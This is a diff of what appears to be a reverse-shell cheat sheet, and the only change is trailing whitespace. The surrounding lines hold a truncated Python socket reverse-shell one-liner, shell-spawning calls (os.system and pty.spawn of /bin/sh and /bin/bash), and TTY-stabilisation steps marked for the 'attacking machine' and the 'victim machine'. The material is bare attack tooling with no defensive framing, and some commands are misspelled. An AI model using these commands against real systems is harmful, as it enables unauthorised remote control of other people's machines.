@@ -8,7 +8,8 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF\_INET,socket.SO
 
 python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
 
-Plesse check below:
+Plesse check below:   
+
 PS1='\e[33;1m\u@\h: \e[31m\W\e[0m\$
 
 **BASH**
@@ -71,15 +72,15 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 
 background remote shell with Ctrl+Z    // on victim machine
 
-stty -a | grep rows    //on attacking machine
-speed 38400 baud; rows 55; columns 205; line = 0;
-echo $TERM     // on attacking machine
-sty raw echo   // attacking machine
-fg             // attacking machine
-reset          // attacking machine
-export TERM=xterm-256color //on victim machine
-export SHELL=BASH          //on victim machine
-stty rows 55 columns 205   //on victim machine. See stty -a
+stty -a | grep rows    //on attacking machine  
+speed 38400 baud; rows 55; columns 205; line = 0;  
+echo $TERM     // on attacking machine  
+sty raw echo   // attacking machine  
+fg             // attacking machine  
+reset          // attacking machine  
+export TERM=xterm-256color //on victim machine  
+export SHELL=BASH          //on victim machine  
+stty rows 55 columns 205   //on victim machine. See stty -a  
 
 **SHELLS:**
 
